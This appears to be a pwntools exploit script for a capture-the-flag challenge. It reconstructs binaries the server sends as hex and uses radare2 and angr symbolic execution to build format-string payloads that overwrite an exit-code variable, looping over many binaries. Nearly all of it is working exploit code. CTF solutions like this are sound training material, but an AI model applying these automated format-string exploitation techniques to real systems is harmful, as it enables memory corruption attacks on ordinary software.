#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template --host pwn.utctf.live --port 5002
from pwn import *

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR
# ./exploit.py GDB HOST=example.com PORT=4141
host = args.HOST or 'pwn.utctf.live'
port = int(args.PORT or 5002)

def start_local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe] + argv, *a, **kw)

def start_remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return start_local(argv, *a, **kw)
    else:
        return start_remote(argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================

from binascii import unhexlify
import angr
import claripy
import r2pipe

io = start()

io.sendlineafter(b"Press enter when you're ready for the first binary.\n", b"")

while True:
    vuln = b""

    while True:
        line = io.recvline()

        if len(line) == 1:
            break

        dump = line.split()[1:9]

        for i in dump:
            vuln += unhexlify(i)

    f = open('./vuln', 'wb')
    f.write(vuln)
    f.close()

    exe = context.binary = ELF('vuln')

    io.recvuntil(b"Binary should exit with code ")
    code = int(io.recvuntil(b"\n", drop=True))

    r = r2pipe.open(exe.path)
    r.cmd('aaa')
    ret = r.cmdj('pdfj @ sym.permute')['ops'][-1]['offset']

    p = angr.Project(exe.path)

    payload_chars = [claripy.BVS("byte_%d" % i, 8) for i in range(0x200)]
    payload = claripy.Concat(*payload_chars + [claripy.BVV(b'\n')])
    payload_addr = 0

    s = p.factory.call_state(exe.sym['permute'], payload_addr,
            add_options=set.union(
                angr.options.unicorn,
                {
                    angr.options.LAZY_SOLVES,
                    angr.options.ZERO_FILL_UNCONSTRAINED_MEMORY,
                    angr.options.ZERO_FILL_UNCONSTRAINED_REGISTERS,
                }))

    s.memory.store(payload_addr, payload)

    sim = p.factory.simgr(s)

    sim.explore(find=ret)

    fmt = fmtstr_payload(8, {exe.sym['exit_code']: code})

    payload_in = b""

    if sim.found:
        sol = sim.found[0]

        payload_out = sol.memory.load(
                payload_addr,
                len(fmt) + 1
                )

        sol.add_constraints(payload_out == fmt + b'\0')

        payload_in = sol.solver.eval(payload, cast_to=bytes)
    else:
        print("no solution")
        exit()

    io.sendafter(b"You have 60 seconds to provide input: \n", payload_in)
    io.recvline()

    if io.recv(1) != b'0':
        break

io.interactive()

